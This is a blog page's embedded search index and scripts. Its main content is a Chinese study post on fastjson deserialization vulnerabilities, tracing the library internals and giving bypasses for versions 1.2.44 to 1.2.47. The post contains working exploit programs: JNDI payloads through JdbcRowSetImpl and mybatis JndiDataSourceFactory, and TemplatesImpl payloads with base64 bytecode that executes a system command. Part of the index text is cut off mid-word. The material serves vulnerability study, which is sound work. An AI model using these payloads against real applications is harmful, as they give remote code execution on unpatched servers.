    <script type="application/json" id="site-search-index">[{"content":"Hugo 与 GitHub Pages 把 hugo.toml 里的 baseURL 改为你的 GitHub Pages 地址，然后推送到 GitHub。\n如果使用用户主页仓库 fupanc-w1n.github.io，配置为：\nbaseURL = \u0026#34;https://fupanc-w1n.github.io/\u0026#34;","date":"2026-5-15","summary":"Hugo 与 GitHub Pages 把 hugo.toml 里的 baseURL 改为你的 GitHub Pages 地址，然后推送到 GitHub。\n如果使用用户主页仓库 fupanc-w1n.github.io，配置为：\nbaseURL = \u0026#34;https://fupanc-w1n.github.io/\u0026#34;","title":"Hugo 与 GitHub Pages","url":"/posts/notes/hugo-github-pages/"},{"content":"快速开始 在 content/posts 下创建 Markdown 文件即可新增文章。\nhugo new content posts/guide/my-first-post.md 如果你希望在导航里出现一个文件夹，请在对应目录下添加 _index.md。目录显示名称会使用文件夹名。","date":"2026-5-14","summary":"快速开始 在 content/posts 下创建 Markdown 文件即可新增文章。\nhugo new content posts/guide/my-first-post.md 如果你希望在导航里出现一个文件夹，请在对应目录下添加 _index.md。目录显示名称会使用文件夹名。","title":"快速开始","url":"/posts/guide/getting-started/"},{"content":"fastjson反序列化 fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，可以序列化一个对象为json字符串们，也可以反序列化一个json字符串为一个对象，其实也就是和jackson差不多的。\n基本过程了解 在这里先来看json序列化和反序列化的过程。\n导入依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 如下就是一个简单的序列化和反序列化的过程：\npackage fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 输出为：\n=====序列化===== {\u0026#34;age\u0026#34;:1233,\u0026#34;name\u0026#34;:\u0026#34;fupanc\u0026#34;} =====反序列化===== fupanc 1233 这里的转换过程其实是和jackson差不多的，都是调用的getter和setter来进行的取值与赋值。\n@JSONField注解 不知道有没有用，先简单了解一下，通过这个注解，我们可以自定义字段的名称的输出，如下demo：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 此时的输出为：\n=====序列化===== {\u0026#34;user_age\u0026#34;:1233,\u0026#34;user_name\u0026#34;:\u0026#34;fupanc\u0026#34;} =====反序列化===== fupanc 1233 从结果可以看出来这里的具体示例，也就是当使用了@JSONField这个注解，序列化时会将这个注解标注的字段的字段名序列化为注解指定的字段名，而反序列化时就会自动识别到这个注解标注的字段从而成功反序列化赋值。\n调试分析 调试分析一下这里获取getter和setter的过程，这里就来简单说说我这里的调试过程\n序列化过程 在JSON.toJSONString()处打一个断点开始调试，通过调试时的变量的值的替换，在这一步后发现调用变量存在了getter方法：\n此时的调用栈为：\nwrite:272, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:14, Fastjson_Test (fastjson) 我们跟进这个getObjectWriter()方法，然后一直跟进，可以发现其实主要的获取到getter方法存在如下：\n跟进这个createJavaBeanSerializer()方法：\n这里主要起作用的代码也在图中标注了，最重要的就是方法内部的第一行代码，跟进这里调用的buildBeanInfo()方法：\n再跟进这里的parserAllFieldToCache()方法：\n常见的获取字段名的操作，获取到后还将起放入到了这形参传入的HashMap类实例中，还可以看到是尝试获取了父类的字段值。\n回到buildBeanInfo()方法，另外一个非常重要的方法就是computeGetters()方法：\n可以很容易看出来这里就是一个获取方法的操作，最后还是将其放入到键值对中：\n过程就不具体说了，可以自己跟一下。再回到buildBeanInfo()方法，然后对字段进行了一下排序，再返回了一个实例化的SerializeBeanInfo类：\n所以这里其实也就是一个获取到类中的信息的函数调用的操作，其实基本获取到了需要的所有消息。然后就会调用到createJavaBeanSerializer()方法：\n后续具体也就不说了，都是一些进行处理的操作。\n最后这里赋值的getters就是后续要用到的，此时的调用栈如下：\n\u0026lt;init\u0026gt;:73, JavaBeanSerializer (com.alibaba.fastjson.serializer) createJavaBeanSerializer:152, SerializeConfig (com.alibaba.fastjson.serializer) createJavaBeanSerializer:126, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:580, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:355, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:329, JSONSerializer (com.alibaba.fastjson.serializer) write:272, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:14, Fastjson_Test (fastjson) 其他过程就不多说了，重点就是获取到getter方法，对于后面的调用getter方法来获取值，代码如下：\n调用invoke()方法来进行调用，调用栈如下：\nget:450, FieldInfo (com.alibaba.fastjson.util) getPropertyValueDirect:110, FieldSerializer (com.alibaba.fastjson.serializer) write:196, JavaBeanSerializer (com.alibaba.fastjson.serializer) write:275, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:13, Fastjson_Test (fastjson) 自己调一下就知道了。\n反序列化过程 打断点于JSON.parseObject()方法，反序列化，主要还是对setter方法的获取和调用。调试发现获取到类是在如下方法：\n那么想要获取到的过程就在这个方法中，此时调用栈：\nparseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjso \u0026#34;[{,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } TemplatesImpl就是：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;[{,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } ——————\n1.2.44 同样是在checkAutoType()方法中，如下逻辑：\n前一个if是判断是否以[开头，第二个应该是判断最后是否以;结尾吧，从这里可以看出就是修复了[的payload，过滤了数组形式的payload。\n1.2.45 这个版本还存在一个黑名单绕过，但是其实是一个组件漏洞，这里利用到的是mybatis组建，需要添加依赖：\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 注意修改fastjson的版本。\n其实这个漏洞基本看一下payload就懂了，利用了组件，所以算是利用另外的类，在1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.45版本只要有这个组件都能打。\nPOC如下：\n{\u0026#34;@type\u0026#34;:\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;data_source\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/hello\u0026#34;}} 对应类的setter方法有jndi漏洞：\n所以构造了直接打就行了：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\\u0026#34;,\\\u0026#34;properties\\\u0026#34;:{\\\u0026#34;data_source\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;}}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行弹出计算机，注意还是需要设置autoTypeSupport为true。\n1.2.47 这个算是比较重要的漏洞点了，可以不开始autoTypeSupport触发反序列化漏洞。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.47\n这里还是从1.2.47版本来分析。\n还是跟进checkAutoType()方法，其实在这个类不止最后那个需要autoTypeSupport为true才能返回加载到的clazz，如下代码：\n这里的expectClass变量默认为null，那么只要我们能在TypeUtils.getClassFromMapping()或者deserializers.findClass()找到想要利用的类，那么就可以直接在这里返回加载到的类。\n跟进这里的TypeUtils.getClassFromMapping()方法：\n可以看到是从mapping中取值，那么这个mappings是怎么进行处理的呢，重新跟了一遍流程，没看到有赋值的地方，那么肯定就是TypeUtils类的static语句在进行处理，翻看了一下这个类的static语句，可以看到如下内容： 跟进这个addBaseClassMappings()方法，里面加载了很多类（下图只是部分）： 似乎不可控，那么我们再去看deserializers.findClass()获取类的方法：\n可以看到这里想要返回clazz的话有一定条件，并且这里是与IdentityHashMap类的buckets变量有关，然后看这里的条件，需要key为Class属性。那么我们看一下这里deserializers变量的赋值逻辑，这里肯定就是与ParserConfig类有关了，这个也是之前说的形参传递的类变量，具体如下：\n调用的方法： 这次就需要跟进ParserConfig类的构造函数了，他的构造函数调用了initDeserializers()方法，这个方法内部可以看到如下内容：\n里面调用了很多方法，注意图中，是放入了一个Class.class的键，看这个对应的类，之类就是获取到这个类：\n而这个类的deserialze()方法存在一个存在一个利用点：\n这里会调用loadClass()方法，就是我们之前熟知的方法，在这里存在一个利用点： 这里的cache默认是true，所以这里会将对应的className放进mappings，并且这里的参数是可控的，从参数传递来看，这里的className就是前面的strVal变量：\n而setVal变量是由objVal变量转换来的，objVal又是从json字符串解析来的：\n是不是看到这里还有点懵，别急，为什么这里要提到deserialze()方法呢，当我们正常反序列化时，同时其实从前面的调试过程可以知道，是会获取deserializer并调用它的deserialze()方法：\n所以对应的，我们可以先尝试传入Class.class，从而获取到MiscCodec类实例，从而调用到它的deserialze()方法，从而往mappings中放入想要利用的类，从而在直接在后续中获得想要的类，如下：\n所以综上上面的思路，需要调用两次，一次放进指定类，一次加载触发反序列化，可以尝试如下构造：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) throws Exception { String json = \u0026#34;{\\\u0026#34;1\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\\\u0026#34;2\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}}\\n\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行后弹出计算机，注意是打的jndi打法。\n这里的细节就是没有设置autoTypeSupport，默认为false，那么第一个判断黑名单的就不会进入：\n而第二个判断黑名单的地方不会到达：\n直接在中间就找到直接结束了，所以也是payload中第二个可以那样设置的原因。\nTemplatesImpl的打法如下：\npackage fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; public class Fastjson_Test{ public static void main(String[] args) throws Exception { String json = \u0026#34;{\\\u0026#34;1\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;},\\\u0026#34;2\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}}\\n\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } 运行后均弹出计算机。\n确实可以。\n1.2.68 而在1.2.48版本之后，在MiscCodec中修改了cache的默认值为false，并且对TypeUtils.loadClass中的mapping.put做了限制。\n改一下版本即可，这里以1.2.68版本来表示一下对1.2.47版本的限制，首先就是将cache改成false：\n其次就是。剩下的后面再学，不想看了现在。去看反序列化调用链了。具体利用可看如下文章：\nhttps://su18.org/post/fastjson-1.2.68/#charsequenceinputstream\n和nivia的文章。\n这个提高篇也可以看一看： https://xz.aliyun.com/news/12852\n参考文章：\nhttps://xz.aliyun.com/news/14309\nhttps://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37\nhttps://tttang.com/archive/1579/#toc_1244","date":"2026-5-6","summary":"fastjson反序列化 fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，可以序列化一个对象为json字符串们，也可以反序列化一个json字符串为一个对象，其实也就是和jackson差不多的。\n基本过程了解 在这里先来看json序列化和反序列化的过程。\n导入依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 如下就是一个简单的序列化和反序列化的过程：\npackage fastjson; import com.alibaba.fastjson.JSON; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { private String name; private int age; public Object object; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 输出为：","title":"fastjson反序列化","url":"/posts/fastjson/1/"},{"content":"Fastjson 反序列化补充 这里可以继续补充 Fastjson 反序列化相关笔记。","date":"2026-5-6","summary":"Fastjson 反序列化补充 这里可以继续补充 Fastjson 反序列化相关笔记。","title":"Fastjson 反序列化补充","url":"/posts/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]</script>
    <script>
      (function () {
        var root = document.querySelector("[data-search-root]");
        var indexNode = document.getElementById("site-search-index");

        if (!root || !indexNode) {
          return;
        }

        var input = root.querySelector("[data-search-input]");
        var resultsBox = root.querySelector("[data-search-results]");

        if (!input || !resultsBox) {
          return;
        }

        function normalize(value) {
          return String(value || "").toLowerCase();
        }

        var index = [];
        try {
          index = JSON.parse(indexNode.textContent || "[]");
          if (typeof index === "string") {
            index = JSON.parse(index);
          }
        } catch (error) {
          index = [];
        }

        if (!Array.isArray(index)) {
          index = [];
        }

        index = index.map(function (item) {
          var title = normalize(item.title);
          var summary = normalize(item.summary);
          var content = normalize(item.content);

          return Object.assign({}, item, {
            _title: title,
            _summary: summary,
            _content: content,
            _haystack: [title, summary, content].join(" ")
          });
        });

        function clearResults() {
          resultsBox.innerHTML = "";
          resultsBox.hidden = true;
          input.setAttribute("aria-expanded", "false");
        }

        function getExcerpt(item, terms) {
          var source = String(item.summary || item.content || "").replace(/\s+/g, " ").trim();

          if (!source) {
            return "";
          }

          var normalizedSource = normalize(source);
          var hitIndex = -1;

          terms.some(function (term) {
            hitIndex = normalizedSource.indexOf(term);
            return hitIndex >= 0;
          });

          if (hitIndex < 0) {
            return source.slice(0, 110) + (source.length > 110 ? "..." : "");
          }

          var start = Math.max(hitIndex - 34, 0);
          var end = Math.min(hitIndex + 92, source.length);

          return (start > 0 ? "..." : "") + source.slice(start, end) + (end < source.length ? "..." : "");
        }

        function createResult(item, terms) {
          var link = document.createElement("a");
          link.className = "site-search-result";
          link.href = item.url;

          var heading = document.createElement("strong");
          heading.textContent = item.title || "未命名文章";
          link.appendChild(heading);

          var meta = document.createElement("span");
          meta.className = "site-search-meta";
          meta.textContent = item.date || "文章";
          link.appendChild(meta);

          var excerptText = getExcerpt(item, terms);
          if (excerptText) {
            var excerpt = document.createElement("span");
            excerpt.className = "site-search-excerpt";
            excerpt.textContent = excerptText;
            link.appendChild(excerpt);
          }

          return link;
        }

        function renderResults(query) {
          var terms = normalize(query).trim().split(/\s+/).filter(Boolean);

          if (!terms.length) {
            clearResults();
            return;
          }

          var matches = index.reduce(function (items, item) {
            var matched = terms.every(function (term) {
              return item._haystack.indexOf(term) >= 0;
            });

            if (!matched) {
              return items;
            }

            var score = terms.reduce(function (total, term) {
              if (item._title.indexOf(term) >= 0) {
                total += 8;
              }

              if (item._summary.indexOf(term) >= 0) {
                total += 4;
              }

              if (item._content.indexOf(term) >= 0) {
                total += 1;
              }

              return total;
            }, 0);

            items.push({ item: item, score: score });
            return items;
          }, []);

          matches.sort(function (a, b) {
            return b.score - a.score || String(a.item.title).localeCompare(String(b.item.title), "zh-Hans-CN");
          });

          resultsBox.innerHTML = "";

          if (!matches.length) {
            var empty = document.createElement("div");
            empty.className = "site-search-empty";
            empty.textContent = "没有找到相关文章";
            resultsBox.appendChild(empty);
          } else {
            var status = document.createElement("div");
            status.className = "site-search-status";
            status.textContent = "找到 " + matches.length + " 篇文章";
            resultsBox.appendChild(status);

            matches.slice(0, 8).forEach(function (match) {
              resultsBox.appendChild(createResult(match.item, terms));
            });
          }

          resultsBox.hidden = false;
          input.setAttribute("aria-expanded", "true");
        }

        input.addEventListener("input", function () {
          renderResults(input.value);
        });

        input.addEventListener("focus", function () {
          renderResults(input.value);
        });

        input.addEventListener("keydown", function (event) {
          if (event.key === "Escape") {
            clearResults();
            input.blur();
            return;
          }

          if (event.key === "Enter") {
            var firstResult = resultsBox.querySelector(".site-search-result");
            if (firstResult && input.value.trim()) {
              window.location.href = firstResult.href;
            }
          }
        });

        document.addEventListener("click", function (event) {
          if (!root.contains(event.target)) {
            clearResults();
          }
        });
      })();

      document.addEventListener("click", function (event) {
        var toggle = event.target.closest(".tree-toggle");
        if (!toggle) {
          return;
        }

        var branch = document.getElementById(toggle.getAttribute("aria-controls"));
        var item = toggle.closest(".is-section");
        if (!branch || !item) {
          return;
        }

        var isOpen = toggle.getAttribute("aria-expanded") === "true";
        toggle.setAttribute("aria-expanded", String(!isOpen));
        branch.hidden = isOpen;
        item.classList.toggle("is-open", !isOpen);
      });

      document.querySelectorAll(".article > pre").forEach(function (pre) {
        if (pre.parentElement && pre.parentElement.classList.contains("code-block")) {
          return;
        }

        var wrapper = document.createElement("div");
        wrapper.className = "code-block";
        pre.parentNode.insertBefore(wrapper, pre);
        wrapper.appendChild(pre);
      });

      document.querySelectorAll(".article .highlight, .article .code-block").forEach(function (block) {
        var pre = block.matches("pre") ? block : block.querySelector("pre");
        if (!pre || block.querySelector(".code-copy")) {
          return;
        }

        var button = document.createElement("button");
        button.className = "code-copy";
        button.type = "button";
        button.textContent = "复制";
        button.setAttribute("aria-label", "复制代码");

        button.addEventListener("click", function () {
          var code = pre.querySelector("code") || pre;
          navigator.clipboard.writeText(code.innerText).then(function () {
            button.textContent = "已复制";
            button.classList.add("is-copied");
            window.setTimeout(function () {
              button.textContent = "复制";
              button.classList.remove("is-copied");
            }, 1400);
          });
        });

        block.appendChild(button);
      });
    </script>
